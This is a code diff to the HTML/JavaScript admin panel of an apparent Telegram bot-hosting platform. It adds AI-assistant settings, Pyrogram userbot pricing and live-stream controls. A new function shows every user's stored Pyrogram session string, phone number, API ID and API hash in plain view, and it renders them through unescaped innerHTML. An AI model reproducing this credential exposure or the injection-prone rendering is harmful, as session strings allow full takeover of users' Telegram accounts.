@@ -2051,36 +2051,51 @@
                             </div>
                         </div>
 
-                        <div>
-                            <label class="text-xs text-gray-400 uppercase font-bold block mb-1 flex items-center">
-                                <i class="fas fa-key text-purple-400 mr-2"></i> Bytez API Key
-                            </label>
-                            <div class="relative">
-                                <input type="password" id="api-bytez-key"
-                                    class="w-full bg-black/40 border border-white/10 focus:border-blue-500 rounded-lg p-3 transition-colors pr-10"
-                                    placeholder="Enter your Bytez API Key">
-                                <button onclick="togglePasswordVisibility('api-bytez-key')"
-                                    class="absolute right-3 top-3.5 text-gray-400 hover:text-white transition-colors">
-                                    <i class="fas fa-eye"></i>
-                                </button>
+                        <!-- AI Assistant System Configuration -->
+                        <div class="glass-card p-4 rounded-2xl border border-purple-500/30 col-span-1 md:col-span-2">
+                            <h4 class="font-bold mb-2 flex items-center gap-2 text-purple-400 text-sm">
+                                <i class="fas fa-brain text-purple-400 animate-pulse"></i> AI Assistant System & Platform Monitor
+                            </h4>
+                            <p class="text-xs text-gray-400 mb-3">
+                                Connect your custom third-party AI provider API or model. The AI Assistant monitors system status, diagnoses bot errors, and sends real-time alerts to Admin Telegram.
+                            </p>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
+                                <div>
+                                    <label class="text-[11px] text-gray-400 uppercase font-bold block mb-1">API Base URL</label>
+                                    <input type="text" id="api-ai-assistant-url" placeholder="https://api.openai.com/v1"
+                                        class="w-full bg-black/40 border border-white/10 focus:border-purple-500 rounded-lg p-2.5 text-white text-xs">
+                                </div>
+                                <div>
+                                    <label class="text-[11px] text-gray-400 uppercase font-bold block mb-1">API Key</label>
+                                    <div class="relative">
+                                        <input type="password" id="api-ai-assistant-key" placeholder="Enter Assistant API Key"
+                                            class="w-full bg-black/40 border border-white/10 focus:border-purple-500 rounded-lg p-2.5 text-white text-xs pr-10">
+                                        <button onclick="togglePasswordVisibility('api-ai-assistant-key')" class="absolute right-3 top-2.5 text-gray-400 hover:text-white text-xs">
+                                            <i class="fas fa-eye"></i>
+                                        </button>
+                                    </div>
+                                </div>
+                                <div>
+                                    <label class="text-[11px] text-gray-400 uppercase font-bold block mb-1">Model Name</label>
+                                    <input type="text" id="api-ai-assistant-model" placeholder="gpt-4o / gemini-1.5-flash / custom-model"
+                                        class="w-full bg-black/40 border border-white/10 focus:border-purple-500 rounded-lg p-2.5 text-white text-xs">
+                                </div>
+                                <div>
+                                    <label class="text-[11px] text-gray-400 uppercase font-bold block mb-1">Auto Error Monitoring & Alerts</label>
+                                    <div class="flex items-center justify-between p-2.5 bg-black/30 rounded-lg border border-white/10 h-[38px]">
+                                        <span class="text-xs text-gray-300">Notify Admin on Bot Errors</span>
+                                        <label class="relative inline-flex items-center cursor-pointer">
+                                            <input type="checkbox" id="api-ai-assistant-alert" class="sr-only peer">
+                                            <div class="w-9 h-5 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-purple-500"></div>
+                                        </label>
+                                    </div>
+                                </div>
+                                <div class="col-span-1 md:col-span-2">
+                                    <label class="text-[11px] text-gray-400 uppercase font-bold block mb-1">System Prompt / Bot Assistant Instructions</label>
+                                    <textarea id="api-ai-assistant-prompt" rows="2" placeholder="Instructions for AI assistant to monitor the bot platform and handle system issues..."
+                                        class="w-full bg-black/40 border border-white/10 focus:border-purple-500 rounded-lg p-2.5 text-white text-xs"></textarea>
+                                </div>
                             </div>
-                            <p class="text-xs text-gray-500 mt-1">Used for real-time AI Watermark Removal</p>
-                        </div>
-
-                        <div>
-                            <label class="text-xs text-gray-400 uppercase font-bold block mb-1 flex items-center">
-                                <i class="fas fa-key text-orange-400 mr-2"></i> OpenRouter API Key
-                            </label>
-                            <div class="relative">
-                                <input type="password" id="api-openrouter-key"
-                                    class="w-full bg-black/40 border border-white/10 focus:border-blue-500 rounded-lg p-3 transition-colors pr-10"
-                                    placeholder="Enter your OpenRouter API Key">
-                                <button onclick="togglePasswordVisibility('api-openrouter-key')"
-                                    class="absolute right-3 top-3.5 text-gray-400 hover:text-white transition-colors">
-                                    <i class="fas fa-eye"></i>
-                                </button>
-                            </div>
-                            <p class="text-xs text-gray-500 mt-1">Alternative provider for AI generation & Watermark removal</p>
                         </div>
                     </div>
 
@@ -3854,6 +3869,12 @@
                                         class="w-full bg-black/40 border border-white/10 focus:border-blue-500 rounded-lg p-2.5 text-white">
                                     <p class="text-xs text-gray-600 mt-1">Default: 1 Gem/hour for Live SMS Forwarder</p>
                                 </div>
+                                <div class="bg-black/20 rounded-lg p-4 border border-sky-500/20">
+                                    <label class="text-xs text-gray-400 uppercase font-bold block mb-2">🤖 Pyrogram Gems per Hour</label>
+                                    <input type="number" id="conf-pyrogram-gems-per-hour" placeholder="1" min="0" step="0.1"
+                                        class="w-full bg-black/40 border border-white/10 focus:border-sky-500 rounded-lg p-2.5 text-white">
+                                    <p class="text-xs text-gray-600 mt-1">Default: 1 Gem/hour for Pyrogram Userbot</p>
+                                </div>
                                 <div class="bg-black/20 rounded-lg p-4 border border-purple-500/20">
                                     <label class="text-xs text-gray-400 uppercase font-bold block mb-2">Max Bots per
                                         User (hard cap)</label>
@@ -3871,28 +3892,6 @@
                                 Max bots = 1 + floor((referrals − base) ÷ extra_per_bot), capped at hard cap.<br>
                                 <span class="text-gray-500">Example (base=2, extra=2, cap=3): 2 refs→1 bot, 4 refs→2
                                     bots, 6+ refs→3 bots</span>
-                            </div>
-                        </div>
-
-                        <!-- Live SMS Bot Hosting Configuration -->
-                        <div class="mb-6">
-                            <h4
-                                class="text-lg font-semibold text-blue-400 mb-4 flex items-center border-b border-white/10 pb-2">
-                                <i class="fas fa-sms mr-2"></i> Live SMS Bot Hosting Configuration
-                            </h4>
-                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                                <div class="bg-black/20 rounded-lg p-4 border border-blue-500/20">
-                                    <label class="text-xs text-gray-400 uppercase font-bold block mb-2">HOSTING BASE URL</label>
-                                    <input type="text" id="conf-lsb-base-url" placeholder="https://livesms-host-production.up.railway.app"
-                                        class="w-full bg-black/40 border border-white/10 focus:border-blue-500 rounded-lg p-2.5 text-white text-sm">
-                                    <p class="text-xs text-gray-600 mt-1">Base URL of Python hosting server</p>
-                                </div>
-                                <div class="bg-black/20 rounded-lg p-4 border border-blue-500/20">
-                                    <label class="text-xs text-gray-400 uppercase font-bold block mb-2">HOSTING API KEY</label>
-                                    <input type="password" id="conf-lsb-api-key" placeholder="Enter API Key"
-                                        class="w-full bg-black/40 border border-white/10 focus:border-blue-500 rounded-lg p-2.5 text-white text-sm">
-                                    <p class="text-xs text-gray-600 mt-1">API Key for authentication with hosting server</p>
-                                </div>
                             </div>
                         </div>
 
@@ -3929,6 +3928,15 @@
                                     <input type="number" id="conf-live-sms-bot-cost" placeholder="10" min="0"
                                         class="w-full bg-black/40 border border-white/10 focus:border-blue-500 rounded-lg p-2.5 text-white">
                                     <p class="text-xs text-gray-600 mt-1">Tokens per deployment. Default: 10</p>
+                                </div>
+                                <div class="bg-black/20 rounded-lg p-4 border border-sky-500/20">
+                                    <div class="flex items-center gap-2 mb-2">
+                                        <i class="fas fa-robot text-sky-400"></i>
+                                        <label class="text-sm font-semibold text-gray-300">Pyrogram Session Token</label>
+                                    </div>
+                                    <input type="number" id="conf-pyrogram-deploy-cost" placeholder="100" min="0"
+                                        class="w-full bg-black/40 border border-white/10 focus:border-sky-500 rounded-lg p-2.5 text-white">
+                                    <p class="text-xs text-gray-600 mt-1">Tokens/Gems per generation/deployment. Default: 100</p>
                                 </div>
                             </div>
                         </div>
@@ -5535,15 +5543,20 @@
                                 <h4 class="font-bold flex items-center gap-2 text-purple-400">
                                     <i class="fas fa-broadcast-tower text-purple-400 animate-pulse"></i> Live Stream Assistant Bot
                                 </h4>
-                                <label class="relative inline-flex items-center cursor-pointer">
-                                    <input type="checkbox" id="gm_userbotEnabled" class="sr-only peer">
-                                    <div
-                                        class="w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-purple-500">
-                                    </div>
-                                </label>
+                                <div class="flex items-center gap-2">
+                                    <span id="livestream-bot-status-badge" class="px-2 py-0.5 rounded-full text-[10px] font-bold bg-green-500/20 text-green-400 border border-green-500/30">
+                                        🟢 ACTIVE & READY
+                                    </span>
+                                    <label class="relative inline-flex items-center cursor-pointer">
+                                        <input type="checkbox" id="gm_userbotEnabled" class="sr-only peer">
+                                        <div
+                                            class="w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-purple-500">
+                                        </div>
+                                    </label>
+                                </div>
                             </div>
                             <p class="text-xs text-gray-400 mb-4">
-                                During live streams, the Assistant Bot will join the stream to control voice chat, enable music playback, and protect users from spam.
+                                Enter your Live Stream Assistant Bot Token. The Assistant Bot auto-joins streams, streams music/audio into voice chats, and allows real-time control via commands and dashboard.
                             </p>
                             <div class="space-y-3">
                                 <!-- Hidden API configuration fields to preserve backward compatibility/internal logic -->
@@ -5556,6 +5569,25 @@
                                     <input type="password" id="gm_userbotSessionString"
                                         placeholder="Enter Assistant Bot Token..."
                                         class="w-full bg-black/30 border border-white/10 rounded-lg p-3 text-white text-sm focus:border-purple-500 focus:outline-none">
+                                </div>
+
+                                <!-- Live Stream Quick Action Controls -->
+                                <div class="p-3 bg-black/30 rounded-xl border border-purple-500/20">
+                                    <div class="text-[11px] font-bold text-purple-300 uppercase tracking-wider mb-2">Stream Controls</div>
+                                    <div class="grid grid-cols-2 md:grid-cols-4 gap-2">
+                                        <button type="button" onclick="controlLiveStreamAssistant('join')" class="bg-purple-600/30 hover:bg-purple-600/50 text-purple-200 border border-purple-500/40 py-2 px-2.5 rounded-lg text-xs font-bold transition flex items-center justify-center gap-1">
+                                            <i class="fas fa-sign-in-alt text-purple-400"></i> Join Stream
+                                        </button>
+                                        <button type="button" onclick="controlLiveStreamAssistant('play')" class="bg-green-600/30 hover:bg-green-600/50 text-green-200 border border-green-500/40 py-2 px-2.5 rounded-lg text-xs font-bold transition flex items-center justify-center gap-1">
+                                            <i class="fas fa-play text-green-400"></i> Play Music
+                                        </button>
+                                        <button type="button" onclick="controlLiveStreamAssistant('pause')" class="bg-yellow-600/30 hover:bg-yellow-600/50 text-yellow-200 border border-yellow-500/40 py-2 px-2.5 rounded-lg text-xs font-bold transition flex items-center justify-center gap-1">
+                                            <i class="fas fa-pause text-yellow-400"></i> Pause Audio
+                                        </button>
+                                        <button type="button" onclick="controlLiveStreamAssistant('stop')" class="bg-red-600/30 hover:bg-red-600/50 text-red-200 border border-red-500/40 py-2 px-2.5 rounded-lg text-xs font-bold transition flex items-center justify-center gap-1">
+                                            <i class="fas fa-stop text-red-400"></i> End Stream
+                                        </button>
+                                    </div>
                                 </div>
 
                                 <!-- Userbot Feature Toggles -->
@@ -7657,8 +7689,18 @@
                 // Bot Tokens
                 const elBot = document.getElementById('api-bot-token');
                 const elBackup = document.getElementById('api-backup-token');
-                const elBytez = document.getElementById('api-bytez-key');
-                const elOpenRouter = document.getElementById('api-openrouter-key');
+                // AI Assistant Configuration
+                const elAiUrl = document.getElementById('api-ai-assistant-url');
+                const elAiKey = document.getElementById('api-ai-assistant-key');
+                const elAiModel = document.getElementById('api-ai-assistant-model');
+                const elAiPrompt = document.getElementById('api-ai-assistant-prompt');
+                const elAiAlert = document.getElementById('api-ai-assistant-alert');
+
+                if (elAiUrl) elAiUrl.value = api.aiAssistantUrl || '';
+                if (elAiKey) elAiKey.value = api.aiAssistantKey || '';
+                if (elAiModel) elAiModel.value = api.aiAssistantModel || '';
+                if (elAiPrompt) elAiPrompt.value = api.aiAssistantPrompt || '';
+                if (elAiAlert) elAiAlert.checked = api.aiAssistantAlertAdmin === true;
 
                 // URLs & Links
                 const elMini = document.getElementById('api-miniapp-url');
@@ -7726,8 +7768,11 @@
                 botToken: document.getElementById('api-bot-token')?.value || '',
                 backupBotToken: document.getElementById('api-backup-token')?.value || '',
                 adminId: document.getElementById('api-admin-id')?.value || '',
-                bytezKey: document.getElementById('api-bytez-key')?.value || '',
-                openRouterKey: document.getElementById('api-openrouter-key')?.value || '',
+                aiAssistantUrl: document.getElementById('api-ai-assistant-url')?.value || '',
+                aiAssistantKey: document.getElementById('api-ai-assistant-key')?.value || '',
+                aiAssistantModel: document.getElementById('api-ai-assistant-model')?.value || '',
+                aiAssistantPrompt: document.getElementById('api-ai-assistant-prompt')?.value || '',
+                aiAssistantAlertAdmin: document.getElementById('api-ai-assistant-alert')?.checked || false,
                 miniAppUrl: document.getElementById('api-miniapp-url')?.value || '',
                 requiredChannel: document.getElementById('api-channel-link')?.value || '',
                 requiredGroup: document.getElementById('api-group-link')?.value || '',
@@ -7976,6 +8021,8 @@
                         document.getElementById('conf-bh-gems-per-hour').value = c.bhGemsPerHour !== undefined ? c.bhGemsPerHour : 1;
                     if (document.getElementById('conf-live-sms-bot-gems-per-hour'))
                         document.getElementById('conf-live-sms-bot-gems-per-hour').value = c.liveSmsBotGemsPerHour !== undefined ? c.liveSmsBotGemsPerHour : 1;
+                    if (document.getElementById('conf-pyrogram-gems-per-hour'))
+                        document.getElementById('conf-pyrogram-gems-per-hour').value = c.pyrogramGemsPerHour !== undefined ? c.pyrogramGemsPerHour : 1;
                     if (document.getElementById('conf-bh-max-bots'))
                         document.getElementById('conf-bh-max-bots').value = c.bhMaxBots !== undefined ? c.bhMaxBots : 3;
 
@@ -7986,6 +8033,8 @@
                         document.getElementById('conf-bg-remove-cost').value = c.bgRemoveCost !== undefined ? c.bgRemoveCost : 10;
                     if (document.getElementById('conf-live-sms-bot-cost'))
                         document.getElementById('conf-live-sms-bot-cost').value = c.liveSmsBotCost !== undefined ? c.liveSmsBotCost : 10;
+                    if (document.getElementById('conf-pyrogram-deploy-cost'))
+                        document.getElementById('conf-pyrogram-deploy-cost').value = c.pyrogramDeployCost !== undefined ? c.pyrogramDeployCost : 100;
 
                     // Card Prices
                     if (document.getElementById('conf-card-gemini'))
@@ -8148,11 +8197,13 @@
                 bhGemsPerHour: getFloatValue('conf-bh-gems-per-hour', 1),
                 bhMaxBots: getValue('conf-bh-max-bots', 3),
                 liveSmsBotGemsPerHour: getFloatValue('conf-live-sms-bot-gems-per-hour', 1),
+                pyrogramGemsPerHour: getFloatValue('conf-pyrogram-gems-per-hour', 1),
 
                 // Service Tool Costs
                 videoDownloadCost: getValue('conf-video-download-cost', 10),
                 bgRemoveCost: getValue('conf-bg-remove-cost', 10),
                 liveSmsBotCost: getValue('conf-live-sms-bot-cost', 10),
+                pyrogramDeployCost: getValue('conf-pyrogram-deploy-cost', 100),
 
                 sellingRewards: {
                     gmail: getValue('reward-gmail'),
@@ -8351,7 +8402,7 @@
                 'services': 'Services Management',
                 'shopmanage': 'Shop Management',
                 'costmanage': 'Cost Management',
-            'pyrogram': 'Pyrogram User Bot',
+                'pyrogram': 'Pyrogram User Bot',
                 'buttons': 'Button Management',
                 'groups': 'Groups & Moderation',
                 'premiumemail': 'Premium Email',
@@ -8453,11 +8504,11 @@
                             if (apiKeysIcon) apiKeysIcon.style.transform = 'rotate(180deg)';
                         }
                         break;
-                    case 'pyrogram':
-                        loadAdminPyrograms();
-                        break;
                     case 'costmanage':
                         loadAllCosts();
+                        break;
+                    case 'pyrogram':
+                        loadAdminPyrograms();
                         break;
                     case 'cards':
                         loadSectionServices('cards');
@@ -12400,6 +12451,25 @@
         function broadcastToGroups() {
             nav('broadcast');
             document.getElementById('bc-target').value = 'group';
+        }
+
+        async function controlLiveStreamAssistant(action) {
+            let query = '';
+            if (action === 'play') {
+                query = prompt('Enter Music/Audio Stream URL or Track Name:', 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3');
+                if (query === null) return;
+            }
+            try {
+                const res = await fetch('/api/admin/livestream-assistant/action', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action, query })
+                });
+                const data = await res.json();
+                alert(data.message || (data.success ? 'Command executed successfully!' : 'Action failed'));
+            } catch (e) {
+                alert('Error communicating with Live Stream Assistant: ' + e.message);
+            }
         }
 
         function exportGroupList() {
@@ -17261,6 +17331,65 @@
         async function adminDeleteSmsBotPage(botId) {
             await adminDeleteSmsBot(botId);
             loadLiveSmsHostingData();
+        }
+
+        async function loadAdminPyrograms() {
+            try {
+                const res = await fetch('/api/admin/pyrogram/list');
+                const data = await res.json();
+                const tbody = document.getElementById('adminPyrogramList');
+                if (!tbody) return;
+                tbody.innerHTML = '';
+                if (!data.success || !data.sessions || data.sessions.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="6" class="p-4 text-center text-gray-500 text-sm">No Pyrogram sessions saved by users yet.</td></tr>';
+                    return;
+                }
+                data.sessions.forEach(s => {
+                    const tr = document.createElement('tr');
+                    tr.className = 'border-b border-white/5 hover:bg-white/5 transition';
+                    tr.innerHTML = `
+                        <td class="p-3 text-sm font-semibold">${s.username || 'User'} <span class="text-xs text-gray-500">(ID: ${s.userId})</span></td>
+                        <td class="p-3 text-sm font-mono">${s.phoneNumber || '-'}</td>
+                        <td class="p-3 text-sm font-mono">${s.apiId || '-'}</td>
+                        <td class="p-3 text-sm font-mono text-gray-400">${s.apiHash || '-'}</td>
+                        <td class="p-3 text-sm font-mono max-w-xs truncate" title="${s.sessionString}">${s.sessionString || '-'}</td>
+                        <td class="p-3 text-right">
+                            <button onclick="adminDeletePyrogram('${s.id}')" class="text-red-400 hover:text-red-300 p-1">
+                                <i class="fas fa-trash-alt"></i>
+                            </button>
+                        </td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+            } catch (e) {
+                console.error(e);
+            }
+        }
+        async function adminDeletePyrogram(id) {
+            if (!confirm('Are you sure you want to permanently delete this Pyrogram session?')) return;
+            try {
+                const res = await fetch('/api/admin/pyrogram/' + id, { method: 'DELETE' });
+                const data = await res.json();
+                if (data.success) {
+                    showToast('Deleted successfully', 'success');
+                    loadAdminPyrograms();
+                } else {
+                    alert('Failed to delete');
+                }
+            } catch (e) { console.error(e); }
+        }
+        async function adminDeleteAllPyrogram() {
+            if (!confirm('WARNING: This will permanently delete ALL Pyrogram sessions from the database. Are you sure?')) return;
+            try {
+                const res = await fetch('/api/admin/pyrogram/all', { method: 'DELETE' });
+                const data = await res.json();
+                if (data.success) {
+                    showToast('All sessions deleted', 'success');
+                    loadAdminPyrograms();
+                } else {
+                    alert('Failed to delete');
+                }
+            } catch (e) { console.error(e); }
         }
 
         // Load on nav
